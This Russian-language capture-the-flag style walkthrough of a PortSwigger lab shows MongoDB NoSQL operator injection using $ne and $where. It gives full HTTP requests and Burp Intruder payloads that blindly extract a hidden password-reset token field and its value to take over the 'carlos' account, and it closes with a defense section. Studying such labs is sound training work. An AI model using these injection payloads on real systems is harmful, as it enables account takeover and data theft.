# 📘 PortSwigger Lab: Exploiting NoSQL operator injection to extract unknown fields

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-nosql-operator-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-unknown-fields
> 🎯 Тема: NoSQL Injection — эксплуатация операторов ($ne, $where) для извлечения скрытых полей
> 🧪 Уровень: Practitioner
> ✅ Статус: Solved
> 🛠 Инструменты: Burp Suite (Repeater, Intruder — Cluster bomb)

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🗺 Схема атаки](#attack-scheme)
- [🔍 Шаг 1 — Разведка и детект `$ne`](#step1)
- [🔍 Шаг 2 — Проверка инъекции JS через `$where`](#step2)
- [🔍 Шаг 3 — Перебор имен полей (Object.keys)](#step3)
- [🔍 Шаг 4 — Проверка найденного поля на эндпоинте](#step4)
- [🔍 Шаг 5 — Извлечение значения токена](#step5)
- [🔍 Шаг 6 — Сброс пароля и логин](#step6)
- [📨 Примеры запросов](#requests)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Функция входа работает на MongoDB и уязвима к NoSQL-инъекциям. Задача:

```text
1. Извлечь значение токена сброса пароля для пользователя carlos.
2. Войти в аккаунт carlos.
```

> **Подсказка:** в базе есть скрытое поле с токеном, которое не отображается в ответе.

---

<a id="theory"></a>

## 🧠 Краткая теория

NoSQL-инъекции в MongoDB часто возникают, когда ввод пользователя попадает в JSON-объект запроса без должной проверки. Операторы вроде `$ne` (не равно) или `$where` (выполнение JavaScript) позволяют изменять логику запроса.

В отличие от классических SQL-инъекций, здесь нет прямого вывода данных, но можно использовать **слепую эксфильтрацию**: заставлять базу отвечать «да/нет» на вопросы о содержимом скрытых полей через разницу в ответах сервера (например, «Account locked» против «Invalid username or password»).

---

<a id="idea"></a>

## 🧩 Ключевая идея

1. **Оператор `$ne`** позволяет обойти проверку пароля и узнать, существует ли пользователь.
2. **Оператор `$where`** позволяет внедрить JavaScript-код, который будет выполнен внутри MongoDB. Мы используем его для проверки условий на основе скрытых полей.
3. **`Object.keys(this)`** возвращает массив имен всех полей документа пользователя. Мы перебираем индексы, чтобы найти имя поля с токеном.
4. **`this.ИМЯ_ПОЛЯ.match()`** позволяет посимвольно извлекать значение токена, используя регулярные выражения.

---

<a id="attack-scheme"></a>

## 🗺 Схема атаки

```text
1. Детект:     $ne подтверждает уязвимость (Account locked).
2. JS-инъекция: $where: "1" vs "0" → разные ответы.
3. Поиск полей: Object.keys(this)[N].match(...) → перебор имен полей.
4. Проверка:    GET /forgot-password?ИМЯ=invalid → Invalid token.
5. Извлечение:  this.ИМЯ.match('^.{N}С.*') → перебор значения токена.
6. Сброс:       GET /forgot-password?ИМЯ=ТОКЕН → смена пароля.
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка и детект `$ne`

1. Попытка входа с `carlos` / `invalid` → ошибка `"Invalid username or password"`.
2. Меняем пароль на `{"$ne":"invalid"}` → получаем `"Account locked"`. Это подтверждает, что оператор `$ne` работает и уязвимость есть.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Проверка инъекции JS через `$where`

1. Добавляем `"$where": "0"` → `"Invalid username or password"` (условие ложно).
2. Меняем на `"$where": "1"` → `"Account locked"` (условие истинно).
3. **Вывод:** JavaScript-код в `$where` выполняется.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Перебор имен полей (Object.keys)

Используем Intruder (Cluster bomb) для перебора имени поля по индексам.

**Пейлоад:**
```json
"$where":"Object.keys(this)[§1§].match('^.{§2§}§3§.*')"
```
* **Payload 1:** индекс поля (`0`, `1`, `2`, `3`, `4`...).
* **Payload 2:** позиция символа (`0-20`).
* **Payload 3:** буква/цифра (`a-z`, `A-Z`, `0-9`).

**Анализ:** Сортируем по Payload 1 и Length. Ищем ответы с `"Account locked"`. Собираем буквы из Payload 3 по позициям. В итоге находим имя поля: `newPwdTkn`.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Проверка найденного поля на эндпоинте

1. Отправляем `GET /forgot-password?foo=invalid` → обычный ответ.
2. Отправляем `GET /forgot-password?newPwdTkn=invalid` → ошибка `"Invalid token"`.
3. Это подтверждает, что поле `newPwdTkn` существует и используется в эндпоинте сброса пароля.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Извлечение значения токена

Снова Intruder (Cluster bomb), но теперь меняем `$where`.

**Пейлоад:**
```json
"$where":"this.newPwdTkn.match('^.{§1§}§2§.*')"
```
* **Payload 1:** позиция символа (`0-20`).
* **Payload 2:** символ (`a-z`, `A-Z`, `0-9`).

**Анализ:** Сортируем по Payload 1 и Length. Ищем `"Account locked"`. Собираем токен посимвольно.

---

<a id="step6"></a>

## 🔍 Шаг 6 — Сброс пароля и логин

1. Отправляем `GET /forgot-password?newPwdTkn=СОБРАННЫЙ_ТОКЕН`.
2. В ответе получаем ссылку для сброса. Открываем её через **Request in browser > Original session**.
3. Меняем пароль Карлоса и логинимся.

---

<a id="requests"></a>

## 📨 Примеры запросов

### Шаг 2 — JS-инъекция

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}
```

### Шаг 5 — Извлечение токена (Intruder)

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.newPwdTkn.match('^.{§1§}§2§.*')"}
```

---

<a id="response"></a>

## 📥 Пример результата

### Шаг 3 — Поиск имени поля

```text
Payload 1 (index): 4
Payload 2 (pos):   0
Payload 3 (char):  n
Length:            длиннее остальных
→ "Account locked" (true)
```

### Шаг 5 — Сборка токена

```text
Позиция 0: e
Позиция 1: c
Позиция 2: 3
...
→ Токен: ec3f9aedf1c147a4
```

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. POST /login → $ne → Account locked (уязвимость).
2. POST /login → $where: 1/0 → подтверждение JS-инъекции.
3. Intruder → Object.keys(this)[N].match(...) → найдено поле newPwdTkn.
4. GET /forgot-password?newPwdTkn=invalid → Invalid token.
5. Intruder → this.newPwdTkn.match(...) → извлечен токен.
6. GET /forgot-password?newPwdTkn=ТОКЕН → сброс пароля.
7. Логин carlos → Solved.
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

1. **Отсутствие валидации JSON:** Сервер принимает объекты и операторы MongoDB.
2. **Использование `$where`:** Позволяет выполнять JS-код, что открывает доступ к `this` (документу).
3. **Различимость ответов:** `"Account locked"` vs `"Invalid username or password"` — это оракул для слепой эксфильтрации.
4. **Доступ к скрытым полям:** `this.newPwdTkn` доступно в условии, даже если не выводится в ответе.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

```text
1. Ищите операторы: $ne, $gt, $where — признак NoSQL-инъекции.
2. Создайте оракул: Найдите любую разницу в ответах (текст, длина, код).
3. Используйте $where: Если доступен JS, можно обращаться к полям документа.
4. Автоматизируйте: Intruder (Cluster bomb) — идеально для посимвольного перебора.
5. Проверяйте эндпоинты: Найденное имя поля может работать в других местах (например, /forgot-password).
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

* **Неверный регистр:** `newPwdTkn` $
eq$ `newpwdTkn`. Всегда копируйте точное имя.
* **Отсутствие куки:** Intruder не наследует сессию браузера. Нужна свежая `Cookie: session=...`.
* **Пустое поле:** Токен создается только после запроса на сброс пароля. Сначала инициируйте сброс.
* **Неправильный эндпоинт:** Для проверки токена нужен `GET /forgot-password`, а не `POST /login`.

---

<a id="defense"></a>

## 🛡 Защита

1. **Валидация типов:** Не принимать объекты там, где ожидается строка.
2. **Запрет `$where`:** Убрать или ограничить использование `$where` в запросах (`security.javascriptEnabled: false`).
3. **Параметризация:** Использовать строгие фильтры вместо конкатенации.
4. **Единые ошибки:** `"Invalid username or password"` для всех случаев вместо подробного `"Account locked"`.

---

<a id="checklist"></a>

## ✅ Чек-лист

- [ ] `$ne` подтверждает уязвимость
- [ ] `$where: 1/0` подтверждает JS-инъекцию
- [ ] Intruder находит поле `newPwdTkn`
- [ ] `GET /forgot-password?newPwdTkn=invalid` → `Invalid token`
- [ ] Intruder извлекает токен
- [ ] Сброс пароля и логин `carlos`
- [ ] Статус: Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через слепую эксфильтрацию с использованием операторов MongoDB `$ne` и `$where`. Мы нашли скрытое поле `newPwdTkn`, извлекли его значение посимвольно и использовали для сброса пароля. Главный урок: даже если данные не отображаются, их можно извлечь, заставив базу отвечать на вопросы «да/нет».

---

[⬆ Вернуться к началу](#top)
